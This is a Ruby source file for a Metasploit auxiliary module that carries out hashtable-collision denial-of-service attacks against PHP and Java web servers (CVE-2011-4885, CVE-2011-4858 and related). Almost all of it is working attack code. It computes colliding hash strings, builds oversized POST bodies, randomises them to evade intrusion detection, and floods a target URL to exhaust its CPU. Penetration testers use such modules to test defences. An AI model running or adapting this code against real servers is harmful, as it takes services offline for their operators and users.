##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Dos

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Hashtable Collisions',
			'Description'   => %q{
									A variety of programming languages suffer from a denial-of-service (DoS) condition against storage functions
									of key/value pairs in hash data structures, the condition can be leveraged by exploiting predictable collisions
									in the underlying hashing algorithms.
									The issue finds particular exposure in web server applications and/or frameworks. In particular, the lack of
									sufficient limits for the number of parameters in POST requests in conjunction with the predictable collision
									properties in the hashing functions of the underlying languages can render web applications vulnerable to the
									DoS condition. The attacker, using specially crafted HTTP requests, can lead to a 100% of CPU usage which can
									last up to several hours depending on the targeted application and server performance, the amplification
									effect is considerable and requires little bandwidth and time on the attacker side.

									Tested with PHP + httpd, Tomcat, Glassfish, Geronimo. Generates a random Payload to bypass IDS.
			},
			'Author'        =>
			[
				'Christian Mehlmauer <FireFart[at]gmail.com>'
			],
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision$',
			'References'    =>
			[
				['URL', 'http://www.ocert.org/advisories/ocert-2011-003.html'],
				['URL', 'http://www.nruns.com/_downloads/advisory28122011.pdf'],
				['CVE', '2011-5034'],
				['CVE', '2011-5035'],
				['CVE', '2011-4885'],
				['CVE', '2011-4858']
			],
			'DisclosureDate'=> 'Dec 28 2011'))

		register_options(
		[
			Opt::RPORT(80),
			OptEnum.new('TARGET', [ true, 'Target to attack', nil, ['PHP','Java']]),
			OptString.new('URL', [ true, "The request URI", '/' ]),
			OptInt.new('RLIMIT', [ true, "Number of requests to send", 50 ])
		], self.class)

		register_advanced_options(
		[
			OptInt.new('recursivemax', [false, "Maximum recursions when searching for collisionchars", 15]),
			OptInt.new('maxpayloadsize', [false, "Maximum size of the Payload in Megabyte. Autoadjust if 0", 0]),
			OptInt.new('collisionchars', [false, "Number of colliding chars to find", 5]),
			OptInt.new('collisioncharlength', [false, "Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)", 2]),
			OptInt.new('payloadlength', [false, "Length of each parameter in the payload", 8])
		], self.class)
	end

	def generatePayload
		# Taken from:
		# https://github.com/koto/blog-kotowicz-net-examples/tree/master/hashcollision

		@recursivecounter = 1
		collisionchars = computeCollisionChars
		return nil if collisionchars == nil
		length = datastore['payloadlength']
		size = collisionchars.length
		post = ""
		maxvaluefloat = size ** length
		maxvalueint = maxvaluefloat.floor
		print_status("Generating POST Data...")
		for i in 0.upto(maxvalueint)
			inputstring = i.to_s(size)
			result = inputstring.rjust(length, "0")
			collisionchars.each {|key, value|
				result = result.gsub(key, value)
			}
			post << "#{Rex::Text.uri_encode(result)}=&"
		end
		return post
	end

	def computeCollisionChars
		print_status("Trying to find Hashes...") if @recursivecounter == 1
		hashes = {}
		counter = 0
		length = datastore['collisioncharlength']
		a = []
		for i in @charrange
			a << i.chr
		end
		# Generate all possible strings
		source = a.repeated_permutation(length).map(&:join)
		# and pick a random one
		basestr = source.sample
		basehash = @function.call(basestr)
		hashes[counter.to_s] = basestr
		counter = counter + 1
		for item in source
			if item == basestr
				next
			end
			if @function.call(item) == basehash
				# Hooray we found a matching hash
				hashes[counter.to_s] = item
				counter = counter + 1
			end
			if counter >= datastore['collisionchars']
				break
			end
		end
		if counter < datastore['collisionchars']
			# Try it again
			if @recursivecounter > datastore['recursivemax']
				print_error("Not enought values found. Please start this script again")
				return nil
			end
			print_status("#{@recursivecounter}: Not enough values found. Trying it again...")
			@recursivecounter = @recursivecounter + 1
			hashes = computeCollisionChars
		else
			print_status("Found values:")
			hashes.each_value {|item|
				print_status("\tValue: #{item}\tHash: #{@function.call(item)}")
				item.each_char {|i|
					print_status("\t\tValue: #{i}\tCharcode: #{i.ord}")
				}
			}
		end
		return hashes
	end

	def DJBXA(inputstring, base, start)
		counter = inputstring.length - 1
		result = start
		inputstring.each_char {|item|
			result = result + ((base ** counter) * item.ord)
			counter = counter - 1
		}
		return result.round
	end

	# PHP's hash function
	def DJBX33A(inputstring)
		return DJBXA(inputstring, 33, 5381)
	end

	# Java's hash function
	def DJBX31A(inputstring)
		return DJBXA(inputstring, 31, 0)
	end

	def run
		case datastore['TARGET']
			when /php/i
				@function = method(:DJBX33A)
				@charrange = Range.new(0, 255)
				if (datastore['maxpayloadsize'] <= 0)
					datastore['maxpayloadsize'] = 8
				end
			when /java/i
				@function = method(:DJBX31A)
				@charrange = Range.new(0, 128)
				if (datastore['maxpayloadsize'] <= 0)
					datastore['maxpayloadsize'] = 2
				end
			else
				print_error("Target #{datastore['TARGET']} not supportec")
				exit
		end

		print_status("Generating Payload...")
		payload = generatePayload
		return if payload == nil
		# trim to maximum payload size (in MB)
		maxinmb = datastore['maxpayloadsize']*1024*1024
		payload = payload[0,maxinmb]
		# remove last invalid(cut off) parameter
		position = payload.rindex("=&")
		payload = payload[0,position+1]
		print_status("Payload generated")

		for x in 1..datastore['RLIMIT']
			print_status("sending Request ##{x}...")
			opts = {
				'method'	=>	'POST',
				'uri'		=>	datastore['URL'],
				'data'		=>	payload
			}
			send_request_cgi(opts, getresponse = false)
		end
	end
end
